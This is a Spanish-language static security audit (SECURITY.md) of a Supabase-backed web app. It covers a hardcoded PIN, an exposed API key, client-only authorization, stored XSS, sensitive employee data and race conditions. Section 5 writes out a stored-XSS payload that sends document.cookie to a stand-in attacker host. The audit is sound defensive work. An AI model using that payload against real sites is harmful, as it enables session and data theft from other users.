@@ -1,0 +1,105 @@
+# SECURITY.md — Auditoría de seguridad estática de `index.html`
+
+> Auditoría **estática y local**: se leyó el código completo de `index.html`. No se realizaron pruebas contra Supabase, Open-Meteo ni ningún otro servicio externo, ni se intentó explotar nada. Todos los hallazgos son sobre el código tal como está escrito, no sobre el comportamiento observado en producción.
+
+## 1. PIN escritos o descargados en el frontend
+
+- `var ADMIN_PIN = '1234';` (línea 3696) — **PIN de administrador hardcodeado en el código fuente** como valor por defecto ("se sobreescribe con el de Supabase al cargar", según el propio comentario). Si `loadPines()` falla (red caída, tabla vacía, error de permisos), la app queda con `'1234'` como PIN de admin válido, sin ningún aviso al usuario.
+- `USER_PINS` se pobla igual, trayendo los PINes de **todas** las personas desde Supabase al cliente en cada carga de la app (`loadPines()`, línea 3701) — cualquiera con acceso al navegador (DevTools, extensión, proxy) puede leer `USER_PINS` en memoria y obtener el PIN de **todo el equipo**, no solo el propio.
+- Los PIN se comparan en texto plano en el cliente (`checkPin()`, `checkUserPin()`) contra el valor descargado — no hay hashing ni verificación server-side.
+- No hay límite de intentos ni bloqueo temporal tras PIN incorrecto — un PIN de 4 dígitos numéricos tiene solo 10.000 combinaciones, trivialmente forzable por fuerza bruta si alguien automatiza clicks o llama `checkPin()`/`pinKey()` directamente desde la consola.
+
+## 2. Credenciales expuestas
+
+- `SB_URL` y `SB_KEY` (API key anónima de Supabase, JWT) están hardcodeadas en texto plano en el HTML servido al navegador (línea 1701-1702), visibles para cualquiera que abra "Ver código fuente".
+- La key es de tipo `anon`, que en el modelo de Supabase está diseñada para ser pública **si y solo si** hay Row Level Security (RLS) correctamente configurado en cada tabla. Esta auditoría **no puede confirmar** si existe RLS en el proyecto Supabase real (está fuera del alcance: no se accede al proyecto). Dado que toda la lógica de permisos observada vive en el JavaScript del cliente (variable `currentRole`), y no se ve ningún mecanismo de autenticación que la API de Supabase pueda usar para distinguir admin de empleado (no hay JWT de usuario individual, todos comparten la misma `anon key`), **es razonable asumir que, si hay RLS, es a lo sumo básico** (por ejemplo, deshabilitado o abierto a la key anónima) — cualquier persona con la key puede leer/escribir directamente cualquier tabla vía la REST API de Supabase, sin pasar por la UI ni por el chequeo de rol.
+- Este es el hallazgo de mayor severidad del prototipo: **efectivamente, cualquiera que abra el HTML tiene acceso de lectura/escritura completo a toda la base de datos**, independientemente del rol que la UI le muestre.
+
+## 3. Autorización basada solamente en interfaz
+
+- Confirmado en todo el código: `isAdmin()` (línea 3889) es `currentRole === 'admin'`, una variable JavaScript en memoria del cliente.
+- Todos los controles de "solo admin" (ocultar botones, condicionar ramas de render) son controles de **presentación**, no de autorización real — no hay ningún punto donde el servidor (Supabase) verifique el rol del solicitante antes de aceptar una escritura, porque no existe una noción de "usuario autenticado" del lado de Supabase distinta de la app key compartida.
+- Consecuencia práctica: un empleado (rol `user`) puede, sin necesitar el PIN de admin, ejecutar en la consola del navegador exactamente las mismas llamadas `fetch` que usa el botón de admin, y lograr el mismo efecto (crear/editar/eliminar tareas, personas, eventos, etc.).
+
+## 4. Acceso directo a Supabase
+
+- Confirmado: **todas** las operaciones de datos de la app (lectura y escritura) son llamadas `fetch` directas desde el navegador a `https://REDACTED_SUPABASE_PROJECT_REF.supabase.co/rest/v1/...`, usando `sbFetch`/`sbGet`/`sbPost` y, en varios lugares, `fetch` crudo con los mismos headers armados a mano (p. ej. `deltaS`, `dbUpdateStock`, `guardarTipoMascota`, `eliminarTipo`, `eliminarDestino`, `eliminarCategoria`).
+- Esto es exactamente el patrón que la arquitectura objetivo (`docs/ARCHITECTURE.md`) busca eliminar: **el frontend nunca debe hablar directo con la base de datos**. Es la razón principal, desde el punto de vista de seguridad, por la que se justifica introducir un backend propio.
+
+## 5. Riesgos XSS
+
+- Prácticamente toda la interfaz se construye concatenando datos en strings HTML asignados a `innerHTML`, sin ninguna función de escape (`escapeHtml`, `textContent`, sanitizador) en ningún lugar del archivo (se buscó explícitamente y no existe tal función).
+- Campos de texto libre que un usuario (admin o empleado) puede escribir y que luego se insertan sin escapar en `innerHTML` de otras vistas, verificados en el código:
+  - Descripción de tarea (`t.d`) — `rndTareas()`, `rndHistorial()`, `calDia()`.
+  - Texto de novedad (`nv.txt`) — `rndNov()`, `rndInicio()`.
+  - Título y nota de evento (`ev.titulo`, `ev.nota`) — `rndEv()`, `rndInicio()`.
+  - Nombre de ítem de stock (`i.n`) — `sItemH()`, `rndCompras()`.
+  - Motivo de consumo (`con.motivo`) — `rndConsumos()`, `rndReportes()`.
+  - Nombre y descripción de mascota/registro clínico (`m.nombre`, `r.desc`) — `rndMascotas()`, `rndRegistros()`.
+  - Título de foto (`f.titulo`) — `rndFotos()`, `verFoto()`.
+  - Nombre de persona (`p.n`) — usado en decenas de lugares.
+- **Escenario concreto de explotación**: cualquier persona con sesión (admin o empleado) puede escribir, por ejemplo, en el campo "Descripción" de una tarea nueva, un valor como `<img src=x onerror="fetch('https://atacante.example/robo?c='+document.cookie)">`. Ese valor queda guardado en Supabase (sin sanitizar en el servidor tampoco, porque no hay servidor) y se ejecuta como HTML/JS real en el navegador de **cualquier otra persona** (incluido un admin) que abra la pantalla de Tareas — es un **XSS almacenado** clásico, disponible en múltiples módulos, no uno solo.
+- Dado que la sesión vive en `sessionStorage` (no en cookie httpOnly), un XSS exitoso también puede leer `lc_role`/`lc_uid` y, más grave aún, puede simplemente usar `SB_KEY`/`SB_URL` (visibles en el mismo contexto de página) para actuar directamente contra la base de datos con el mismo nivel de acceso que la app entera.
+
+## 6. Datos personales
+
+- La tabla/entidad `empleados_datos` almacena datos personales sensibles de cada empleado: fecha de nacimiento, teléfono, **CUIL** (identificador fiscal/previsional argentino), estado civil, obra social, contacto de emergencia (nombre y teléfono).
+- `hijos` almacena nombre y fecha de nacimiento de menores de edad (hijos de empleados).
+- Ninguno de estos datos tiene cifrado a nivel de aplicación, ni control de acceso más allá del rol de interfaz ya descartado como control real (secciones 2 y 3). Cualquiera con la `SB_KEY` (visible en el HTML) puede leer estos datos directamente vía la API REST de Supabase.
+- Esto es un hallazgo relevante para cualquier obligación de protección de datos personales aplicable (p. ej. Ley 25.326 en Argentina) — se señala como riesgo, sin asumir cuál es el marco legal exacto aplicable al proyecto (fuera del alcance de esta auditoría técnica).
+
+## 7. Fotografías
+
+- Se suben como `data:` URL base64 directamente al campo `src` de la tabla `fotos`, sin validación de tipo MIME real más allá del atributo `accept="image/*"` del `<input>` (que es solo una sugerencia de UI, no una validación de seguridad — un archivo con otra extensión/contenido podría subirse igual si se manipula el input).
+- Sin límite de tamaño de archivo validado en el cliente ni, presumiblemente, en Supabase (no verificable desde el HTML).
+- Cualquier persona logueada (no solo admin) puede eliminar cualquier foto (`verFoto()`, botón sin gate de `isAdmin()` — ver `docs/BUSINESS_RULES.md` §1 y §18).
+- Las fotos pueden incluir menores de edad (hijos de empleados) o personas identificables sin que el código tenga ningún control de consentimiento/privacidad — dato a tener en cuenta para la etapa de integración con Google Drive (permisos de la carpeta/archivos, quién puede verlos).
+
+## 8. Manejo de sesiones
+
+- `sessionStorage.setItem('lc_role', ...)` / `sessionStorage.setItem('lc_uid', ...)` (línea 3836-3837) — persiste el rol y el ID de persona en almacenamiento del navegador, legible por cualquier script que corra en el mismo origen (incluido un XSS, ver sección 5).
+- No hay expiración de sesión más allá del cierre de la pestaña/navegador (comportamiento nativo de `sessionStorage`).
+- No hay invalidación de sesión del lado del servidor (no existe "servidor" en el sentido de sesión — Supabase no sabe nada de `currentRole`).
+- `logout()` solo limpia el `sessionStorage` local; no revoca ni invalida nada a nivel de Supabase (tampoco tendría sentido revocar, porque la key es compartida por toda la app, no por sesión de usuario).
+
+## 9. CORS
+
+- No hay configuración de CORS propia de la aplicación, porque no hay servidor propio — el navegador llama directo a Supabase (que maneja su propio CORS) y a Open-Meteo (público, sin autenticación). No aplica análisis de CORS de "nuestro backend" porque, en el prototipo actual, no existe.
+
+## 10. Validaciones
+
+- Las únicas validaciones observadas son del lado del cliente y superficiales:
+  - Campos de texto requeridos: chequeo de `.trim()` no vacío antes de guardar (tareas, ítems, personas, eventos, hijos).
+  - PIN de admin/persona: regex `/^\d{4}$/` al cambiarlo (`changePin`, `changeUserPin`).
+  - Cantidades numéricas: `parseFloat`/`parseInt` con fallback a `0`, sin rango máximo.
+- No hay validación de formato para CUIL, teléfono, ni ningún campo de `empleados_datos`.
+- No hay validación de tipo de archivo real en la subida de fotos (ver sección 7).
+- Ninguna de estas validaciones existe también del lado del servidor, porque no hay servidor — todas son evitables llamando la API de Supabase directamente con la key expuesta.
+
+## 11. Operaciones concurrentes de inventario
+
+- Confirmado en el código (`gItem()`, `deltaS()`, `gAjuste()`, `guardarConsumo()`): el patrón general es leer el `stock` actual desde el estado en memoria del cliente, calcular el nuevo valor, y hacer un `PATCH` con el valor absoluto final — **sin verificación de que el valor no haya cambiado entre la lectura y la escritura** (sin columna de versión, sin `updated_at` comparado, sin transacción).
+- Riesgo concreto: si dos personas registran un consumo del mismo ítem casi simultáneamente desde dos dispositivos distintos, la segunda escritura puede pisar el resultado de la primera (perder el descuento de stock de una de las dos operaciones), aunque ambos registros de `consumos` queden guardados (el historial de movimientos sería correcto, pero el `stock.stock` final quedaría desincronizado respecto a la suma real de movimientos).
+
+## 12. Riesgos de eliminación y modificación
+
+- Casi todas las eliminaciones usan `confirm()` del navegador como única barrera (tareas, eventos, fotos, personas dan de baja, registros clínicos, categorías, destinos, tipos de mascota) — es una confirmación de UI, no un control de seguridad; no impide un borrado hecho directo contra la API.
+- Eliminaciones físicas (no reversibles desde la app) confirmadas: tareas (+ sus ejecuciones), eventos, fotos, registros clínicos, hijos, tipos de mascota, categorías de stock, y destinos de consumo en su variante "eliminar definitivamente".
+- Bajas lógicas (reversibles) confirmadas: personas (`activa`), destinos de consumo en su variante "solo inactivar", categorías de stock también ofrecen expresamente conservar el vínculo con ítems existentes aunque se borre la categoría del catálogo (dato ya señalado como riesgo de integridad en `docs/DATABASE.md`).
+- No se detectó ningún mecanismo de "papelera" o recuperación tras borrado físico — un borrado accidental de una tarea, evento o foto es irreversible desde la propia app.
+
+## Resumen de severidad (evaluación cualitativa, sujeta a confirmación humana)
+
+| Hallazgo | Severidad estimada |
+|---|---|
+| Acceso completo a la base de datos vía key expuesta en el cliente, sin autenticación real de usuario | Crítica |
+| XSS almacenado en múltiples módulos vía `innerHTML` sin sanitizar | Crítica |
+| Autorización de rol enteramente client-side, evitable desde DevTools | Alta |
+| PIN de 4 dígitos sin límite de intentos, compartido/descargado al cliente completo | Alta |
+| Datos personales sensibles (CUIL, contacto de emergencia, datos de menores) sin control de acceso real | Alta |
+| Eliminación de fotos sin restricción de rol | Media |
+| Sin control de concurrencia en actualizaciones de stock | Media |
+| Fotos como base64 sin validación de tipo/tamaño | Media |
+| Sesión en `sessionStorage`, sin expiración server-side | Media |
+
+Estos hallazgos son, en conjunto, la justificación técnica central de por qué la reconstrucción (`docs/MIGRATION_PLAN.md`) introduce un backend propio con autenticación y autorización reales, y por qué el frontend nunca debe volver a tener credenciales de base de datos.
